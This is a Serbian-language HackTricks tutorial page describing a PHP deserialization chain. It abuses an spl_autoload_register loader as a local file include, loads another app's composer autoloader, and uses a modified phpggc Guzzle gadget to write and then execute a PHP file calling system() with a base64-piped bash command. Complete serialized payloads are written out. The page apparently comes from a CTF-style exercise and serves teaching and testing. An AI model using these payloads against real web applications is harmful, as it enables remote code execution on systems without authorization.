# PHP - Deserialization + Autoload Classes

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Prvo, trebali biste proveriti šta su [**Autoload klase**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserijalizacija + spl\_autoload\_register + LFI/Gadget

Nalazimo se u situaciji gde smo pronašli **PHP deserijalizaciju u web aplikaciji** bez **biblioteke koja je ranjiva na gadgete unutar `phpggc`-a**. Međutim, u istom kontejneru se nalazi **druga web aplikacija sa ranjivim bibliotekama**. Stoga je cilj da se **učita kompozer loader druge web aplikacije** i iskoristi ga da se **učita gadget koji će iskoristiti tu biblioteku sa gadgetom** iz web aplikacije ranjive na deserijalizaciju.

Koraci:

* Pronašli ste **deserijalizaciju** i **nema gadgeta** u trenutnom kodu aplikacije
* Možete iskoristiti funkciju **`spl_autoload_register`** kao što je prikazano u nastavku da biste **učitali bilo koji lokalni fajl sa ekstenzijom `.php`**
* Za to koristite deserijalizaciju gde će ime klase biti unutar **`$name`**. Ne možete koristiti "/" ili "." u imenu klase u serijalizovanom objektu, ali **kod** zamenjuje **donje crte** ("\_") **sa kosim crtama** ("/"). Dakle, ime klase kao što je `tmp_passwd` će biti transformisano u `/tmp/passwd.php` i kod će pokušati da ga učita.\
  Primer gadgeta će biti: **`O:10:"tmp_passwd":0:{}`**

```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```

{% hint style="success" %}
Ako imate **upload fajla** i možete da otpremite fajl sa **`.php` ekstenzijom**, možete **direktno iskoristiti ovu funkcionalnost** i dobiti RCE.
{% endhint %}

U mom slučaju, nisam imao ništa slično, ali unutar **iste kontejnera** postojala je druga veb stranica kompozera sa **ranjivom bibliotekom za `phpggc` gedžet**.

* Da biste učitali ovu drugu biblioteku, prvo morate **učitati kompozer loader te druge veb aplikacije** (jer trenutna aplikacija neće pristupiti bibliotekama druge aplikacije.) **Znajući putanju aplikacije**, to možete veoma lako postići sa: **`O:28:"www_frontend_vendor_autoload":0:{}`** (U mom slučaju, kompozer loader se nalazio u `/www/frontend/vendor/autoload.php`)
* Sada možete **učitati** loader **druge aplikacije**, pa je vreme da **generišete phpggc** **payload** koji ćete koristiti. U mom slučaju, koristio sam **`Guzzle/FW1`**, što mi je omogućilo da **pišem bilo koji fajl u fajl sistem**.
* NAPOMENA: **Generisani gedžet nije radio**, da bi radio, **izmenio** sam payload **`chain.php`** od phpggc i postavio **sve atribute** klasa **sa privatnih na javne**. Ako to nisam uradio, nakon de-serijalizacije stringa, atributi kreiranih objekata ne bi imali vrednosti.
* Sada imamo način da **učitamo loader druge aplikacije** i imamo phpggc payload koji radi, ali moramo **ovo uraditi U ISTOM ZAHTEVU da bi loader bio učitan kada se gedžet koristi**. Za to sam poslao serijalizovan niz sa oba objekta kao:
* Možete videti **prvo učitavanje loadera, a zatim payloada**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Sada možemo **kreirati i pisati datoteku**, međutim, korisnik **ne može pisati u bilo kojem folderu unutar web servera**. Dakle, kao što možete videti u payload-u, PHP poziva **`system`** sa nekim **base64** koji je kreiran u **`/tmp/a.php`**. Zatim, možemo **ponovno koristiti prvi tip payload-a** koji smo koristili kao LFI da učitamo kompozitorov loader druge web aplikacije **da učitamo generisanu datoteku `/tmp/a.php`**. Samo je dodajte u deserialization gadget:

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Rezime payload-a**

* **Učitajte composer autoload** drugog veb aplikacije u istom kontejneru
* **Učitajte phpggc gadget** da biste zloupotrebili biblioteku druge veb aplikacije (početna veb aplikacija podložna deserializaciji nije imala nijedan gadget u svojim bibliotekama)
* Gadget će **kreirati datoteku sa PHP payload-om** u /tmp/a.php sa zlonamernim komandama (korisnik veb aplikacije ne može pisati u bilo kojem folderu bilo koje veb aplikacije)
* Poslednji deo našeg payload-a će **učitati generisanu PHP datoteku** koja će izvršiti komande

Bilo je potrebno **dva puta pozvati ovu deserializaciju**. U mom testiranju, prvi put je datoteka `/tmp/a.php` kreirana, ali nije učitana, a drugi put je pravilno učitana.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
